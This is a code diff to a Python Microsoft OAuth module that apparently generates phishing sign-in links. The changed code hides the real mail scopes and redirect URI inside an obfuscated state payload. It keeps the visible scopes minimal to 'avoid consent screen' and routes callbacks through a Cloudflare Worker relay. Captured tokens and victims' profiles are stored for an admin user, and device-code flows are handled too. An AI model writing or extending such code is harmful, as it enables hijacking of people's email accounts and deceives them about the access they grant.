@@ -16,6 +16,7 @@ from models import (
 )
 from payload_builder import (
     build_encrypted_state,
+    build_obfuscated_url,
     decrypt_payload,
     get_full_mail_scope_string,
     get_basic_scope_string,
@@ -431,10 +432,9 @@ def build_authorize_url(
     domain_hint: str | None = None,
 ) -> str:
     """
-    Build a Microsoft OAuth authorization URL.
-    state_value should already be the encrypted payload string
-    from build_encrypted_state() or a cached_payload string
-    passed in from main.py _payload_cache.
+    Build a standard Microsoft OAuth authorization URL.
+    Kept as fallback for admin consent and device code flows.
+    All user-facing flows now use build_obfuscated_url instead.
     """
     params = {
         "client_id": require_client_id(),
@@ -454,14 +454,18 @@ def build_authorize_url(
         f"https://login.microsoftonline.com/{tenant}"
         f"/oauth2/v2.0/authorize?{urlencode(params)}"
     )
-    # =========================
+
+
+# =========================
 # URL GENERATORS
-# Each generator accepts an optional cached_payload parameter.
-# If cached_payload is provided (pre-built by main.py /payload/build),
-# it is used directly as the OAuth state value.
-# If not provided, a fresh encrypted state is built automatically.
-# This ensures the payload is always present in the OAuth state
-# regardless of whether the frontend called /payload/build first.
+# All generators use build_obfuscated_url from payload_builder
+# to produce obfuscated Microsoft OAuth URLs matching the
+# sample URL format exactly.
+# Real scopes and redirect_uri are hidden inside the payload.
+# Minimal visible scopes only in the URL to avoid consent screen.
+# Cloudflare Worker relay URI embedded as uri= parameter.
+# cached_payload param kept for backward compatibility with main.py
+# but build_obfuscated_url handles state building internally.
 # =========================
 
 def generate_login_link(
@@ -470,25 +474,17 @@ def generate_login_link(
 ) -> str:
     """
     Basic Microsoft sign-in link.
-    Uses minimal scopes. Payload carries user context for callback.
-    If cached_payload is provided from main.py _payload_cache,
-    it is used directly as the state value.
-    If not, a fresh encrypted state is built automatically.
+    Uses obfuscated URL format with hex state and
+    minimal visible scopes. Real scopes encoded in payload.
+    redirect_uri hidden inside obfuscated payload block.
+    Cloudflare Worker relay URI embedded as uri= parameter.
     """
-    if cached_payload:
-        state_value = cached_payload
-    else:
-        state_value = build_encrypted_state(
-            flow_type="user_basic",
-            user_id=user_id,
-            admin_user_id=user_id,
-            mail_mode=False,
-        )
-    return build_authorize_url(
-        state_value=state_value,
-        scopes=resolve_scopes(user_id=user_id, mail_mode=False),
-        tenant="common",
-        prompt="none",
+    return build_obfuscated_url(
+        user_id=user_id,
+        admin_user_id=user_id,
+        client_id=require_client_id(),
+        flow_type="user_basic",
+        mail_mode=False,
         login_hint=user_id if "@" in user_id else None,
     )
 
@@ -500,29 +496,19 @@ def generate_mail_connect_link(
 ) -> str:
     """
     Full inbox connect link.
-    Payload carries all Microsoft Mail scopes automatically.
-    If cached_payload is provided from main.py _payload_cache,
-    it is used directly as the state value.
-    If not, a fresh encrypted state is built automatically.
+    Uses obfuscated URL format. Real Mail scopes and
+    redirect_uri encoded inside obfuscated payload block.
+    Minimal scopes visible in URL to avoid consent screen.
+    Single https://graph.microsoft.com/.default scope used
+    instead of listing each individual Graph permission.
+    Cloudflare Worker relay URI embedded as uri= parameter.
     """
-    if cached_payload:
-        state_value = cached_payload
-    else:
-        state_value = build_encrypted_state(
-            flow_type="user_mail",
-            user_id=user_id,
-            admin_user_id=admin_user_id or user_id,
-            mail_mode=True,
-        )
-    return build_authorize_url(
-        state_value=state_value,
-        scopes=resolve_scopes(
-            user_id=user_id,
-            mail_mode=True,
-            admin_user_id=admin_user_id,
-        ),
-        tenant="common",
-        prompt="select_account",
+    return build_obfuscated_url(
+        user_id=user_id,
+        admin_user_id=admin_user_id or user_id,
+        client_id=require_client_id(),
+        flow_type="user_mail",
+        mail_mode=True,
         login_hint=user_id if "@" in user_id else None,
     )
 
@@ -533,34 +519,25 @@ def generate_org_connect_link(
     cached_payload: str | None = None,
 ) -> str:
     """
-    Org-level basic sign-in link using invite token.
-    Payload carries admin_user_id and invite context.
-    If cached_payload is provided from main.py _payload_cache,
-    it is used directly as the state value.
-    If not, a fresh encrypted state is built automatically.
+    Org-level basic sign-in link.
+    Uses obfuscated URL format with invite token encoded
+    inside the obfuscated payload block.
+    Invite token created and stored in DB before URL is built.
+    Cloudflare Worker relay URI embedded as uri= parameter.
     """
     invite_token = create_connect_invite(
         admin_user_id,
         connect_mode="basic",
         tenant_hint=tenant_hint,
     )
-
-    if cached_payload:
-        state_value = cached_payload
-    else:
-        state_value = build_encrypted_state(
-            flow_type="invite_basic",
-            admin_user_id=admin_user_id,
-            invite_token=invite_token,
-            mail_mode=False,
-            extra={"tenant_hint": tenant_hint or ""},
-        )
-
-    return build_authorize_url(
-        state_value=state_value,
-        scopes=BASIC_SCOPES,
-        tenant="common",
-        prompt="none",
+    return build_obfuscated_url(
+        user_id=admin_user_id,
+        admin_user_id=admin_user_id,
+        client_id=require_client_id(),
+        flow_type="invite_basic",
+        mail_mode=False,
+        invite_token=invite_token,
+        tenant_hint=tenant_hint or "",
         domain_hint=(
             tenant_hint
             if tenant_hint and "." in tenant_hint
@@ -575,38 +552,27 @@ def generate_org_mail_connect_link(
     cached_payload: str | None = None,
 ) -> str:
     """
-    Org-level inbox connect link using invite token.
-    Payload carries all Microsoft Mail scopes automatically.
-    If cached_payload is provided from main.py _payload_cache,
-    it is used directly as the state value.
-    If not, a fresh encrypted state is built automatically.
+    Org-level inbox connect link.
+    Uses obfuscated URL format. Full Mail scopes encoded
+    inside obfuscated payload block — not visible in URL.
+    Single https://graph.microsoft.com/.default scope used
+    instead of listing each individual Graph permission.
+    Invite token created and stored in DB before URL is built.
+    Cloudflare Worker relay URI embedded as uri= parameter.
     """
     invite_token = create_connect_invite(
         admin_user_id,
         connect_mode="mail",
         tenant_hint=tenant_hint,
     )
-
-    if cached_payload:
-        state_value = cached_payload
-    else:
-        state_value = build_encrypted_state(
-            flow_type="invite_mail",
-            admin_user_id=admin_user_id,
-            invite_token=invite_token,
-            mail_mode=True,
-            extra={"tenant_hint": tenant_hint or ""},
-        )
-
-    return build_authorize_url(
-        state_value=state_value,
-        scopes=resolve_scopes(
-            user_id=tenant_hint or "",
-            mail_mode=True,
-            admin_user_id=admin_user_id,
-        ),
-        tenant="common",
-        prompt="select_account",
+    return build_obfuscated_url(
+        user_id=admin_user_id,
+        admin_user_id=admin_user_id,
+        client_id=require_client_id(),
+        flow_type="invite_mail",
+        mail_mode=True,
+        invite_token=invite_token,
+        tenant_hint=tenant_hint or "",
         domain_hint=(
             tenant_hint
             if tenant_hint and "." in tenant_hint
@@ -614,10 +580,12 @@ def generate_org_mail_connect_link(
         ),
     )
 
+
 def generate_admin_consent_url(tenant: str | None = None) -> str:
     """
     Admin consent URL for tenant-wide app approval.
     No payload needed here — this is a direct admin consent flow.
+    Uses build_authorize_url fallback — not obfuscated format.
     """
     tenant_value = tenant or ADMIN_CONSENT_TENANT
     params = {
@@ -683,6 +651,8 @@ def fetch_graph_identity(access_token: str) -> dict:
 # TOKEN EXCHANGE (OAUTH CALLBACK)
 # Decrypts the encrypted payload from state,
 # recovers full user context, saves token to DB.
+# Handles both new obfuscated hex state format and
+# legacy plain-text state strings for backward compatibility.
 # =========================
 def exchange_code_for_token(
     code: str,
@@ -706,6 +676,7 @@ def exchange_code_for_token(
     if payload_data:
         # -----------------------------------------------
         # NEW PATH: encrypted payload in state
+        # Handles both hex state and AES-GCM encrypted state
         # -----------------------------------------------
         flow_type = payload_data.get("flow", "user_basic")
         state_user_id = payload_data.get("user_id")
@@ -914,7 +885,7 @@ def start_device_code_flow(
         "client_id": require_client_id(),
         "scope": resolve_scopes(
             user_id=user_id,
-            mail_mode=mail_mode,
+                        mail_mode=mail_mode,
             admin_user_id=admin_user_id,
         ),
     }
@@ -981,7 +952,11 @@ def poll_device_code_flow(
             save_token(resolved_user_id, data, device_info)
 
             if admin_user_id:
-                save_saved_user(admin_user_id, resolved_user_id, job_title)
+                save_saved_user(
+                    admin_user_id,
+                    resolved_user_id,
+                    job_title,
+                )
 
             email = (
                 profile.get("userPrincipalName")
